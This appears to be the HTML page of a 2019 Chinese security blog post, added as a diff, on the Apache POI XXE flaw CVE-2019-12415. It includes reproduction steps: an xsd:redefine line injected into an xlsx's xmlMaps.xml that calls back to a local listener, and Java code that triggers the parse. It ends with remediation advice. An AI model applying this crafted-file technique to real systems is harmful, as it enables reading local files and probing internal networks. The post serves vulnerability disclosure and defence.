@@ -1,0 +1,312 @@
+<!DOCTYPE HTML>
+<html  lang="zh-CN">
+<head>
+    <meta http-equiv="Content-Type" charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <title>Apache POI &lt;= 4.1.0 XXE 漏洞 (CVE-2019-12415) - 浅蓝 's blog</title>
+	
+    <!-- 使用url函数转换相关路径 -->
+	<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js" data-no-instant></script>
+	<script src="/usr/themes/Bigfa/static/js/lately.min.js" data-no-instant></script>
+    <link rel="stylesheet" href="/usr/themes/Bigfa/static/css/style.css">
+	
+
+    <!-- 通过自有函数输出HTML头部信息 -->
+    <meta name="description" content="关于 CVE-2019-12415这是最近 POI 官方公布出来的一个 XXE 漏洞，可以影响到 4.1.0 版本，官方已在十天前更新了 4.1.1 版本，最新版本修复了这个 XXE漏洞。In ..." />
+<meta name="generator" content="Typecho 1.1/17.10.30" />
+<meta name="template" content="Bigfa" />
+<link rel="alternate" type="application/rss+xml" title="Apache POI &lt;= 4.1.0 XXE 漏洞 (CVE-2019-12415) &raquo; 浅蓝 's blog &raquo; RSS 2.0" href="https://b1ue.cn/feed/archives/241.html" />
+<link rel="alternate" type="application/rdf+xml" title="Apache POI &lt;= 4.1.0 XXE 漏洞 (CVE-2019-12415) &raquo; 浅蓝 's blog &raquo; RSS 1.0" href="https://b1ue.cn/feed/rss/archives/241.html" />
+<link rel="alternate" type="application/atom+xml" title="Apache POI &lt;= 4.1.0 XXE 漏洞 (CVE-2019-12415) &raquo; 浅蓝 's blog &raquo; ATOM 1.0" href="https://b1ue.cn/feed/atom/archives/241.html" />
+<script type="text/javascript">
+(function () {
+    window.TypechoComment = {
+        dom : function (id) {
+            return document.getElementById(id);
+        },
+    
+        create : function (tag, attr) {
+            var el = document.createElement(tag);
+        
+            for (var key in attr) {
+                el.setAttribute(key, attr[key]);
+            }
+        
+            return el;
+        },
+
+        reply : function (cid, coid) {
+            var comment = this.dom(cid), parent = comment.parentNode,
+                response = this.dom('respond-post-241'), input = this.dom('comment-parent'),
+                form = 'form' == response.tagName ? response : response.getElementsByTagName('form')[0],
+                textarea = response.getElementsByTagName('textarea')[0];
+
+            if (null == input) {
+                input = this.create('input', {
+                    'type' : 'hidden',
+                    'name' : 'parent',
+                    'id'   : 'comment-parent'
+                });
+
+                form.appendChild(input);
+            }
+
+            input.setAttribute('value', coid);
+
+            if (null == this.dom('comment-form-place-holder')) {
+                var holder = this.create('div', {
+                    'id' : 'comment-form-place-holder'
+                });
+
+                response.parentNode.insertBefore(holder, response);
+            }
+
+            comment.appendChild(response);
+            this.dom('cancel-comment-reply-link').style.display = '';
+
+            if (null != textarea && 'text' == textarea.name) {
+                textarea.focus();
+            }
+
+            return false;
+        },
+
+        cancelReply : function () {
+            var response = this.dom('respond-post-241'),
+            holder = this.dom('comment-form-place-holder'), input = this.dom('comment-parent');
+
+            if (null != input) {
+                input.parentNode.removeChild(input);
+            }
+
+            if (null == holder) {
+                return true;
+            }
+
+            this.dom('cancel-comment-reply-link').style.display = 'none';
+            holder.parentNode.insertBefore(response, holder);
+            return false;
+        }
+    };
+})();
+</script>
+<script type="text/javascript">
+(function () {
+    var event = document.addEventListener ? {
+        add: 'addEventListener',
+        triggers: ['scroll', 'mousemove', 'keyup', 'touchstart'],
+        load: 'DOMContentLoaded'
+    } : {
+        add: 'attachEvent',
+        triggers: ['onfocus', 'onmousemove', 'onkeyup', 'ontouchstart'],
+        load: 'onload'
+    }, added = false;
+
+    document[event.add](event.load, function () {
+        var r = document.getElementById('respond-post-241'),
+            input = document.createElement('input');
+        input.type = 'hidden';
+        input.name = '_';
+        input.value = (function () {
+    var _F7hyN = /* '4A'//'4A' */''+'mM'//'mM'
++'5U'//'5U'
++//'6w7'
+'b15'+//'XO4'
+'70'+//'q2v'
+'b47'+//'xo'
+'xo'+'f'//'op'
++//'9x'
+'6'+'4'//'e5'
++//'8U'
+'b1a'+'15e'//'A'
++//'Vo'
+'8cd'+'4c8'//'b'
++''///*'y'*/'y'
++//'u'
+'f'+'1'//'PB'
++'aW'//'aW'
++'2P'//'2P'
++'d'//'h'
++'af'//'O5'
++//'c'
+'e'+/* 'nT'//'nT' */''+//'E'
+'e10', _EaQMy = [[0,2],[0,2],[8,10],[25,27],[25,27]];
+    
+    for (var i = 0; i < _EaQMy.length; i ++) {
+        _F7hyN = _F7hyN.substring(0, _EaQMy[i][0]) + _F7hyN.substring(_EaQMy[i][1]);
+    }
+
+    return _F7hyN;
+})();
+
+        if (null != r) {
+            var forms = r.getElementsByTagName('form');
+            if (forms.length > 0) {
+                function append() {
+                    if (!added) {
+                        forms[0].appendChild(input);
+                        added = true;
+                    }
+                }
+            
+                for (var i = 0; i < event.triggers.length; i ++) {
+                    var trigger = event.triggers[i];
+                    document[event.add](trigger, append);
+                    window[event.add](trigger, append);
+                }
+            }
+        }
+    });
+})();
+</script><link rel="stylesheet" type="text/css" href="/usr/plugins/ColorHighlight/res/styles/customemin.css" /><link rel="stylesheet" type="text/css" href="/usr/plugins/ColorHighlight/res/lines.css" /></head>
+
+<body class="is-enableBrandingButtons is-js">
+  <div class="site-main surface-container"> 
+    <div class="butterBar"><p class="butterBar-message"></p></div> 
+   
+   <header class="metabar metabar--bordered metabar--top u-clearfix"> 
+    <div class="metabar-block u-floatLeft" itemprop="publisher" itemscope="" itemtype="https://schema.org/Organization"> 
+     <h1 class="site-title u-floatLeft" itemprop="logo" itemscope="" itemtype="https://schema.org/ImageObject"> <a href="https://b1ue.cn/" class="logo" title="浅蓝 's blog"> <img src="/logo.png" width="38" /></a></h1>  
+    </div> 
+    <div class="metabar-block metabar-center"> 
+		 <nav class="navTabs navTabs--metabar navTabs--narrow" itemtype="http://schema.org/SiteNavigationElement" itemscope=""> 
+			 <div class="layoutSingleColumn layoutSingleColumn--wide">
+				  <ul class="subnav-ul">
+										<li  class="subnav-li"><a class="subnav-item" href="https://b1ue.cn/category.html">分类</a></li><li  class="subnav-li"><a class="subnav-item" href="https://b1ue.cn/archives.html">归档</a></li><li  class="subnav-li"><a class="subnav-item" href="https://b1ue.cn/links.html">友情链接</a></li><li  class="subnav-li"><a class="subnav-item" href="https://b1ue.cn/about.html">关于我</a></li>									  </ul>
+			 </div>
+		</nav> 
+    </div> 
+    <div class="metabar-block u-floatRight"> 
+     <form id="search" class="metabar-predictiveSearch search-form" action="https://b1ue.cn/" role="search" method="GET"> 
+        <label title="Search 浅蓝 's blog"> 
+        <svg xmlns="http://www.w3.org/2000/svg" style="display:none;">
+          <symbol viewBox="0 0 25 25" id="svg-search">
+            <title>svg-search</title>
+            <path d="M20.067 18.933l-4.157-4.157c.837-1.032 1.34-2.345 1.34-3.776 0-3.314-2.686-6-6-6s-6 2.686-6 6 2.686 6 6 6c1.43 0 2.744-.503 3.776-1.34l4.157 4.157c.113.113.27.183.442.183.345 0 .625-.28.625-.625 0-.173-.07-.33-.183-.442zM6.5 11c0-2.62 2.13-4.75 4.75-4.75S16 8.38 16 11s-2.13 4.75-4.75 4.75S6.5 13.62 6.5 11z"
+            />
+          </symbol>
+        </svg>
+        <svg viewBox="0 0 25 25" width="25" height="25" class="svgIcon">
+            <use class="svgIcon-use" xlink:href="#svg-search">
+            </use>
+        </svg>
+         <input id="input" class="textInput textInput--dark textInput--rounded" name="s" type="text" required="true" placeholder="Search 浅蓝 's blog" /> 
+  	   </label>
+     </form> 
+    </div> 
+   </header>
+
+
+    
+    
+
+<div class="layoutSingleColumn">
+    <article class="u-paddingTop50" itemscope="itemscope" itemtype="http://schema.org/Article">
+      <header class="entry-header">
+        <h2 class="entry-title" itemprop="headline">Apache POI &lt;= 4.1.0 XXE 漏洞 (CVE-2019-12415)</h2>
+        <div class="entry-meta">
+            <a><time class="lately-a" datetime="2019-10-26 20:16:00" itemprop="datePublished">2019-10-26 20:16:00</time></a>
+            <span class="middotDivider"></span>
+            <a href="https://b1ue.cn/archives/241.html"><a href="https://b1ue.cn/category/vul/">漏洞</a></a>
+        </div>
+      </header>
+
+      <meta itemscope itemprop="mainEntityOfPage"  itemType="https://schema.org/WebPage" itemid="https://b1ue.cn/archives/241.html"/>
+
+        <div class="grap" itemprop="articleBody">
+            <h1>关于 CVE-2019-12415</h1><p>这是最近 POI 官方公布出来的一个 XXE 漏洞，可以影响到 4.1.0 版本，官方已在十天前更新了 4.1.1 版本，最新版本修复了这个 XXE漏洞。</p><blockquote><p>In Apache POI up to 4.1.0, when using the tool XSSFExportToXml to convert user-provided Microsoft Excel documents, a specially crafted document can allow an attacker to read files from the local filesystem or from internal network resources via XML External Entity (XXE) Processing.</p></blockquote><p>根据官方介绍，漏洞是在使用<code>XSSFExportToXml</code>类 xlsx 转 xml 时触发的。</p><p>diff 了一下 4.1.0 和 4.1.1 XSSFExportToXml 类的源码，发现在 isValid 方法里多设置了一个 feature，问题就出在 <code>org.apache.poi.xssf.extractor.XSSFExportToXml#isValid</code> 方法里，如果<code>org.apache.poi.xssf.extractor.XSSFExportToXml#exportToXML(java.io.OutputStream, java.lang.String, boolean)</code>方法的第三个参数为 true 则会进入<code>isValid</code>触发XXE。</p><p><img src="/usr/uploads/2019/10/3947264059.jpg" alt="1572093353(1).jpg" title="1572093353(1).jpg"></p><h1>复现</h1><p>我改了一下官网的测试用例，如果写成这样的，就会有漏洞。</p><pre><code>XSSFWorkbook wb = new XSSFWorkbook(new FileInputStream(new File(&quot;CustomXMLMappings.xlsx&quot;)));
+
+for (XSSFMap map : wb.getCustomXMLMappings()) {
+     XSSFExportToXml exporter = new XSSFExportToXml(map); // 使用 XSSFExportToXml 将 xlsx 转成 xml
+     exporter.exportToXML(System.out, true);//第一个参数是输出流无所谓，第二个参数要为 true
+}</code></pre><p>然后下载这个 xlsx 文件。</p><blockquote><p><a href="https://github.com/apache/poi/raw/f509d1deae86866ed531f10f2eba7db17e098473/test-data/spreadsheet/CustomXMLMappings.xlsx" target="_blank">https://github.com/apache/poi/raw/f509d1deae86866ed531f10f2eba7db17e098473/test-data/spreadsheet/CustomXMLMappings.xlsx</a></p></blockquote><p>把文件改为“CustomXMLMappings.zip”并解压文件。</p><p>编辑 <code>CustomXMLMappings/xl/xmlMaps.xml</code> 文件。</p><p>在 <code>&lt;xsd:schema&gt;</code> 标签里面加上一行代码。</p><pre><code>&lt;xsd:redefine schemaLocation=&quot;http://127.0.0.1:8080/&quot;&gt;&lt;/xsd:redefine&gt;</code></pre><p><img src="/usr/uploads/2019/10/953734725.jpg" alt="1572097114(1).jpg" title="1572097114(1).jpg"></p><p>然后把 xlsx 释放出来的所有文件再用 zip 打包回去，改成 <code>CustomXMLMappings.xlsx</code>。</p><p>最后一步监听本地 8080 端口，运行这段代码。</p><pre><code>XSSFWorkbook wb = new XSSFWorkbook(new FileInputStream(new File(&quot;CustomXMLMappings.xlsx&quot;)));
+
+for (XSSFMap map : wb.getCustomXMLMappings()) {
+     XSSFExportToXml exporter = new XSSFExportToXml(map); // 使用 XSSFExportToXml 将 xlsx 转成 xml
+     exporter.exportToXML(System.out, true);//第一个参数是输出流无所谓，第二个参数要为 true
+}</code></pre><p><img src="/usr/uploads/2019/10/301783819.jpg" alt="1572096968(1).jpg" title="1572096968(1).jpg"></p><h1>修复</h1><ol><li>更新到 4.1.1 及以上版本。</li><li>不要使用 XSSFExportToXml 类，或者不要让 exportToXML 方法的第二个参数为 true。</li></ol>        </div>
+    </article>
+
+    <div id="comments">
+        
+        <div id="respond-post-241" class="respond">
+    
+        <h3 id="response" class="comments-title">发表留言</h3>
+
+        <form method="post" action="https://b1ue.cn/archives/241.html/comment" id="comment-form" class="responsesForm" role="form">
+            <p class="comment-note">如未标注转载则文章均为本人原创，转载前先吱声，未授权转载我就锤爆你狗头。</p>
+            <p class="comment-note">人生在世，错别字在所难免，无需纠正。</p>
+                        <p  class="comment-form-author comment-form-input">
+                <label for="author">称呼</label>
+                <input type="text" name="author" id="author" class="inputGroup" value="" required />
+            </p>
+            <p  class="comment-form-email comment-form-input">
+                <label for="mail">Email</label>
+                <input type="text" name="mail" id="mail" class="inputGroup" value="" required />
+            </p>
+            <p  class="comment-form-url comment-form-input">
+                <label for="url">网站</label>
+                <input type="text" name="url" id="url" class="inputGroup" placeholder="http://" value="" />
+            </p>
+                        <p class="comment-form-comment comment-form-input">
+                <label for="textarea">内容</label>
+                <textarea rows="8" cols="50" name="text" id="comment" class="inputGroup inputTextarea" required ></textarea>
+            </p>
+            <p class="form-submit">
+                <button type="submit" id="submit" class="submit">提交评论</button><a id="cancel-comment-reply-link" href="https://b1ue.cn/archives/241.html#respond-post-241" rel="nofollow" style="display:none" onclick="return TypechoComment.cancelReply();">取消回复</a>            </p>
+        </form>
+    </div>
+    </div>
+
+
+
+</div><!-- end #main-->
+
+
+<footer class="footer--empty"></footer>
+  </div> <!-- 对应site-main surface-container -->
+<div class="loadingBar"></div>
+<script type="text/javascript" src="/usr/plugins/ColorHighlight/res/highlight.js?version=9.12.0">
+        </script><script type="text/javascript" src="/usr/plugins/ColorHighlight/guess.js"></script><script type="text/javascript" src="/usr/plugins/ColorHighlight/res/clipboard.min.js"></script><script type="text/javascript">$("pre code").each(function(i, block) {hljs.highlightBlock(block);});var l = $("pre code").find("ul").length;
+if(l<=0){
+    $("pre code").each(function(){
+        $(this).html("<ul><li>" + $(this).html().replace(/\n/g,"\n</li><li>") +"\n</li></ul>");
+    });
+  }</script>		<script type="text/javascript" src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js" data-no-instant></script>
+			<script src="/usr/themes/Bigfa/static/js/view-image.min.js" data-no-instant></script>
+		    <script src="https://cdn.bootcss.com/instantclick/3.0.0/instantclick.min.js" data-no-instant></script>
+    <script data-no-instant>
+		InstantClick.on('change', function(isInitialLoad) {
+			$("pre code").each(function(i, block) {hljs.highlightBlock(block);});
+						jQuery(document).ready(function () {
+				$.lately({
+					'target' : '.lately-a,.lately-b,.lately-c'
+				});
+				jQuery.viewImage({
+				'target' : '.view-image img', //需要使用ViewImage的图片
+				'exclude': '.exclude img',    //要排除的图片
+				'delay'  : 300                //延迟时间
+				});
+			});
+		});
+		InstantClick.init('mousedown');
+    </script>
+		
+		<script>
+	(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();	</script>
+	
+</body>
+</html>
